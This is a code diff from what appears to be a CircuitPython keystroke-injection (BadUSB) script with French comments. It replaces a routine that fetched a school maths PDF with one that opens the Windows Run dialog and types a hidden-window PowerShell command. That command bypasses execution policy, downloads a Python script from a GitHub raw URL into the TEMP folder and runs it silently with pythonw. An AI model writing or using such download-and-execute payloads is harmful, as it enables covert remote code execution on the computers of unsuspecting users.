@@ -39,17 +39,16 @@ def pdf_download(kbd, layout):
     kbd.send(Keycode.ENTER)
     time.sleep(1.0)
 
-def pdf_download_and_open(kbd, layout):
-    """Télécharge un PDF puis l'ouvre avec l'application par défaut"""
-    PDF_URL = "https://laprovidence-maths-6eme.jimdofree.com/app/download/5552179912/Chap+6+-+Ex1+-+Nommer+des+angles+-+CORRIGE.pdf?t=1572467357"
-    NEW_PDF_FILENAME = "p.pdf"
+def github_download_and_open(kbd, layout):
+    """Télécharge un programme git puis l'ouvre"""
+    PROGRAM_URL = "https://raw.githubusercontent.com/EEmeka33/CyberDuck/refs/heads/main/duck.py"
+    
     command = (
-        'cmd /c cd /d %USERPROFILE%\\Downloads&&curl -L "'
-        + PDF_URL
-        + '" -o '
-        + NEW_PDF_FILENAME
-        + '&&start '
-        + NEW_PDF_FILENAME
+        'powershell -ep bypass -w h -c "$url=\''
+        + PROGRAM_URL
+        + '\';$out=$env:TEMP+\''
+        + 'cg.py'
+        + '\';iwr $url -o $out;Start-Process pythonw $out'
     )
     
     kbd.send(Keycode.GUI, Keycode.R)
